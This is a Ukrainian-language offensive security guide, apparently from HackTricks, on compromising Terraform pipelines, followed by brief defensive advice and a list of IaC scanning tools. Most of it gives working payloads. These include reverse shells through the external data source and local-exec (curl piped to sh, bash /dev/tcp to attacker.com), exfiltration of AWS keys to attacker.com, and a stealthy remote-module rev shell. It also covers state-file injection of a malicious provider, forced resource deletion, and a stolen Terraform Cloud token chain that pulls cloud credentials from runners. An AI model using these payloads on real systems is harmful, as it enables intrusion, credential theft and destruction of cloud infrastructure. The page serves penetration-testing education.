# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Основна інформація

[З документації:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform — це **інструмент інфраструктури як коду**, який дозволяє вам визначати як **хмарні, так і локальні ресурси** у конфігураційних файлах, що легко читаються, які ви можете версувати, повторно використовувати та ділитися. Потім ви можете використовувати послідовний робочий процес для розгортання та управління всією вашою інфраструктурою протягом її життєвого циклу. Terraform може керувати низькорівневими компонентами, такими як обчислювальні, сховищні та мережеві ресурси, а також високорівневими компонентами, такими як записи DNS та функції SaaS.

#### Як працює Terraform?

Terraform створює та управляє ресурсами на хмарних платформах та інших сервісах через їхні інтерфейси програмування додатків (API). Провайдери дозволяють Terraform працювати практично з будь-якою платформою або сервісом з доступним API.

![](<../images/image (177).png>)

HashiCorp та спільнота Terraform вже написали **більше 1700 провайдерів** для управління тисячами різних типів ресурсів та сервісів, і ця кількість продовжує зростати. Ви можете знайти всі публічно доступні провайдери на [Terraform Registry](https://registry.terraform.io/), включаючи Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog та багато інших.

Основний робочий процес Terraform складається з трьох етапів:

- **Написати:** Ви визначаєте ресурси, які можуть бути на кількох хмарних провайдерах та сервісах. Наприклад, ви можете створити конфігурацію для розгортання програми на віртуальних машинах у мережі Virtual Private Cloud (VPC) з групами безпеки та балансувальником навантаження.
- **План:** Terraform створює план виконання, що описує інфраструктуру, яку він створить, оновить або знищить на основі існуючої інфраструктури та вашої конфігурації.
- **Застосувати:** Після затвердження Terraform виконує запропоновані операції в правильному порядку, враховуючи будь-які залежності ресурсів. Наприклад, якщо ви оновлюєте властивості VPC і змінюєте кількість віртуальних машин у цьому VPC, Terraform спочатку відтворить VPC, перш ніж масштабувати віртуальні машини.

![](<../images/image (215).png>)

### Лабораторія Terraform

Просто встановіть terraform на свій комп'ютер.

Ось у вас є [посібник](https://learn.hashicorp.com/tutorials/terraform/install-cli), а ось [найкращий спосіб завантажити terraform](https://www.terraform.io/downloads).

## RCE в Terraform: отруєння конфігураційного файлу

Terraform **не має платформи, що відкриває веб-сторінку або мережевий сервіс**, який ми можемо перерахувати, тому єдиний спосіб скомпрометувати terraform — це **мати можливість додавати/модифікувати конфігураційні файли terraform** або **мати можливість модифікувати файл стану terraform** (див. розділ нижче).

Однак terraform є **дуже чутливим компонентом** для компрометації, оскільки він матиме **привілейований доступ** до різних місць, щоб працювати належним чином.

Основний спосіб для зловмисника скомпрометувати систему, на якій працює terraform, — це **скомпрометувати репозиторій, що зберігає конфігурації terraform**, оскільки в якийсь момент вони будуть **інтерпретовані**.

Насправді існують рішення, які **автоматично виконують terraform plan/apply після створення PR**, такі як **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Якщо ви зможете скомпрометувати файл terraform, існують різні способи, якими ви можете виконати RCE, коли хтось виконує `terraform plan` або `terraform apply`.

### Terraform plan

Terraform plan — це **найбільш використовувана команда** в terraform, і розробники/рішення, що використовують terraform, викликають її постійно, тому **найпростіший спосіб отримати RCE** — це переконатися, що ви отруїли конфігураційний файл terraform, який виконає довільні команди в `terraform plan`.

**Використання зовнішнього провайдера**

Terraform пропонує [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs), який забезпечує спосіб взаємодії між Terraform та зовнішніми програмами. Ви можете використовувати джерело даних `external`, щоб виконувати довільний код під час `plan`.

Впровадження в конфігураційний файл terraform чогось на зразок наступного виконає rev shell під час виконання `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Використання кастомного провайдера**

Атакуючий може надіслати [кастомний провайдер](https://learn.hashicorp.com/tutorials/terraform/provider-setup) до [Terraform Registry](https://registry.terraform.io/) і потім додати його до коду Terraform у функціональній гілці ([приклад звідси](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Провайдер завантажується в `init` і виконає шкідливий код, коли буде виконано `plan`

Ви можете знайти приклад у [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Використання зовнішнього посилання**

Обидва згадані варіанти корисні, але не дуже приховані (другий варіант більш прихований, але складніший за перший). Ви можете виконати цю атаку навіть **більш приховано**, дотримуючись цих рекомендацій:

- Замість того, щоб додавати rev shell безпосередньо в файл terraform, ви можете **завантажити зовнішній ресурс**, який містить rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Ви можете знайти код rev shell за адресою [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- У зовнішньому ресурсі використовуйте функцію **ref**, щоб приховати **код terraform rev shell у гілці** всередині репозиторію, щось на зразок: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply буде виконано для застосування всіх змін, ви також можете зловживати цим, щоб отримати RCE, інжектуючи **зловмисний Terraform файл з** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Вам просто потрібно переконатися, що деякий payload, наприклад, наступні, закінчується у файлі `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Слідуйте **рекомендаціям з попередньої техніки**, щоб виконати цю атаку **більш приховано, використовуючи зовнішні посилання**.

## Витоки секретів

Ви можете отримати **секретні значення, які використовуються terraform, вивантаживши** команду `terraform apply`, додавши до файлу terraform щось на зразок:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Зловживання файлами стану Terraform

У випадку, якщо у вас є доступ на запис до файлів стану terraform, але ви не можете змінити код terraform, [**це дослідження**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) пропонує кілька цікавих варіантів використання файлу. Навіть якщо у вас є доступ на запис до конфігураційних файлів, використання вектора файлів стану часто є набагато підступнішим, оскільки ви не залишаєте слідів в історії `git`.

### RCE в Terraform: отруєння конфігураційного файлу

Можливо [створити власного провайдера](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) і просто замінити одного з провайдерів у файлі стану terraform на шкідливий або додати фальшивий ресурс, що посилається на шкідливий провайдер.

Провайдер [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) базується на дослідженні та озброює цей принцип. Ви можете додати фальшивий ресурс і вказати довільну команду bash, яку ви хочете виконати, в атрибуті `command`. Коли запускається `terraform`, це буде прочитано та виконано на етапах `terraform plan` і `terraform apply`. У випадку етапу `terraform apply`, `terraform` видалить фальшивий ресурс з файлу стану після виконання вашої команди, прибираючи за собою. Більше інформації та повну демонстрацію можна знайти в [репозиторії GitHub, що містить вихідний код для цього провайдера](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Щоб використовувати це безпосередньо, просто включіть наступне в будь-якому місці масиву `resources` і налаштуйте атрибути `name` та `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Тоді, як тільки `terraform` буде виконано, ваш код запуститься.

### Видалення ресурсів <a href="#deleting-resources" id="deleting-resources"></a>

Існує 2 способи знищити ресурси:

1. **Вставити ресурс з випадковою назвою у файл стану, що вказує на реальний ресурс для знищення**

Оскільки terraform побачить, що ресурс не повинен існувати, він його знищить (слідуючи за реальним ідентифікатором ресурсу). Приклад з попередньої сторінки:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Змініть ресурс для видалення таким чином, щоб його не можна було оновити (щоб його видалили і відтворили)**

Для EC2 інстансу зміна типу інстансу достатня для того, щоб terraform видалив і відтворив його.

### Замініть заблокований провайдер

У разі, якщо ви зіткнулися з ситуацією, коли `hashicorp/external` був заблокований, ви можете повторно реалізувати провайдер `external`, виконавши наступні дії. Примітка: Ми використовуємо форк провайдера external, опублікований за адресою https://registry.terraform.io/providers/nazarewk/external/latest. Ви також можете опублікувати свій власний форк або повторну реалізацію.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Тоді ви можете використовувати `external` як зазвичай.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Цей сценарій використовує виконавці Terraform Cloud (TFC) під час спекулятивних планів для переходу до цільового облікового запису в хмарі.

- Preconditions:
- Вкрасти токен Terraform Cloud з машини розробника. CLI зберігає токени у відкритому вигляді за адресою `~/.terraform.d/credentials.tfrc.json`.
- Токен повинен мати доступ до цільової організації/робочого простору та принаймні дозвіл `plan`. Робочі простори, що підтримуються VCS, блокують `apply` з CLI, але все ще дозволяють спекулятивні плани.

- Виявлення налаштувань робочого простору та VCS через API TFC:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Викликати виконання коду під час спекулятивного плану, використовуючи зовнішнє джерело даних та блок "cloud" Terraform Cloud для націлювання на робочий простір, підтримуваний VCS:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Приклад rsync.sh для отримання зворотного шеллу на TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Запустіть спекулятивний план для виконання програми на епhemeral runner:
```bash
terraform init
terraform plan
```
- Перерахувати та ексфільтрувати ін'єковані облікові дані хмари з виконавця. Під час виконання TFC ін'єктує облікові дані провайдера через файли та змінні середовища:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Очікувані файли в робочому каталозі виконавця:
- GCP:
- `tfc-google-application-credentials` (конфігурація JSON для федерації ідентичності робочого навантаження)
- `tfc-gcp-token` (токен доступу GCP з коротким терміном дії)
- AWS:
- `tfc-aws-shared-config` (конфігурація припущення ролі веб-ідентичності/OIDC)
- `tfc-aws-token` (токен з коротким терміном дії; деякі організації можуть використовувати статичні ключі)

- Використовуйте короткострокові облікові дані поза каналом, щоб обійти VCS ворота:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
З цими обліковими даними зловмисники можуть створювати/модифікувати/знищувати ресурси безпосередньо, використовуючи рідні CLIs, обходячи робочі процеси на основі PR, які блокують `apply` через VCS.

- Оборонні рекомендації:
- Застосовуйте принцип найменших привілеїв для користувачів/команд TFC та токенів. Аудитуйте членство та уникайте надмірних власників.
- Обмежте дозвіл `plan` на чутливих робочих просторах, що підтримуються VCS, де це можливо.
- Застосовуйте списки дозволених постачальників/джерел даних за допомогою політик Sentinel, щоб блокувати `data "external"` або невідомих постачальників. Дивіться рекомендації HashiCorp щодо фільтрації постачальників.
- Вибирайте OIDC/WIF замість статичних облікових даних хмари; розглядайте виконавців як чутливі. Моніторте спекулятивні запуски планів та несподіваний вихід.
- Виявляйте ексфільтрацію артефактів облікових даних `tfc-*` та сповіщайте про підозріле використання програми `external` під час планів.

## Автоматизовані інструменти аудиту

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk пропонує комплексне рішення для сканування Infrastructure as Code (IaC), яке виявляє вразливості та неправильні налаштування в Terraform, CloudFormation, Kubernetes та інших форматах IaC.

- **Особливості:**
- Сканування в реальному часі для вразливостей безпеки та проблем з відповідністю.
- Інтеграція з системами контролю версій (GitHub, GitLab, Bitbucket).
- Автоматизовані запити на виправлення.
- Докладні рекомендації щодо усунення.
- **Реєстрація:** Створіть обліковий запис на [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** - це інструмент статичного аналізу коду для інфраструктури як коду (IaC), а також інструмент аналізу складу програмного забезпечення (SCA) для зображень та відкритих пакетів.

Він сканує хмарну інфраструктуру, що надається за допомогою [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) або [OpenTofu](https://opentofu.org/) і виявляє проблеми з безпекою та відповідністю за допомогою сканування на основі графів.

Він виконує [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), що є скануванням відкритих пакетів та зображень на наявність загальних вразливостей та експозицій (CVE).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

З [**документації**](https://github.com/terraform-compliance/cli): `terraform-compliance` - це легка, орієнтована на безпеку та відповідність тестова рамка для terraform, що дозволяє здійснювати негативне тестування вашої інфраструктури як коду.

- **відповідність:** Переконайтеся, що реалізований код відповідає стандартам безпеки, вашим власним стандартам
- **розробка, орієнтована на поведінку:** У нас є BDD практично для всього, чому б не для IaC?
- **переносимість:** просто встановіть його з `pip` або запустіть через `docker`. Дивіться [Встановлення](https://terraform-compliance.com/pages/installation/)
- **попереднє розгортання:** він перевіряє ваш код перед його розгортанням
- **легкість інтеграції:** він може працювати у вашому конвеєрі (або в git hooks), щоб забезпечити перевірку всіх розгортань.
- **сегрегація обов'язків:** ви можете зберігати свої тести в іншому репозиторії, де за це відповідає окрема команда.

> [!NOTE]
> На жаль, якщо код використовує деякі провайдери, до яких у вас немає доступу, ви не зможете виконати `terraform plan` і запустити цей інструмент.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

З [**документації**](https://github.com/aquasecurity/tfsec): tfsec використовує статичний аналіз вашого коду terraform для виявлення потенційних неправильних налаштувань.

- ☁️ Перевіряє неправильні налаштування у всіх основних (і деяких незначних) хмарних провайдерів
- ⛔ Сотні вбудованих правил
- 🪆 Сканує модулі (локальні та віддалені)
- ➕ Оцінює HCL вирази, а також літеральні значення
- ↪️ Оцінює функції Terraform, наприклад, `concat()`
- 🔗 Оцінює відносини між ресурсами Terraform
- 🧰 Сумісний з Terraform CDK
- 🙅 Застосовує (та прикрашає) визначені користувачем політики Rego
- 📃 Підтримує кілька форматів виводу: lovely (за замовчуванням), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- 🛠️ Налаштовуваний (через CLI флаги та/або конфігураційний файл)
- ⚡ Дуже швидкий, здатний швидко сканувати величезні репозиторії
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Знайдіть вразливості безпеки, проблеми з відповідністю та неправильні налаштування інфраструктури на ранніх етапах циклу розробки вашої інфраструктури як коду за допомогою **KICS** від Checkmarx.

**KICS** означає **K**eeping **I**nfrastructure as **C**ode **S**ecure, це програмне забезпечення з відкритим кодом і є обов'язковим для будь-якого проекту, що використовує хмарні технології.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

З [**документації**](https://github.com/tenable/terrascan): Terrascan - це статичний аналізатор коду для Інфраструктури як Код. Terrascan дозволяє вам:

- Безперешкодно сканувати інфраструктуру як код на наявність неправильних налаштувань.
- Моніторити надану хмарну інфраструктуру на предмет змін конфігурації, які можуть призвести до зміщення позиції, та дозволяє повернутися до безпечної позиції.
- Виявляти вразливості безпеки та порушення відповідності.
- Зменшувати ризики перед наданням хмарної нативної інфраструктури.
- Пропонує гнучкість для локального запуску або інтеграції з вашим CI\CD.
```bash
brew install terrascan
```
## References

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API – Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI – OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider – Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform – Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs – Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
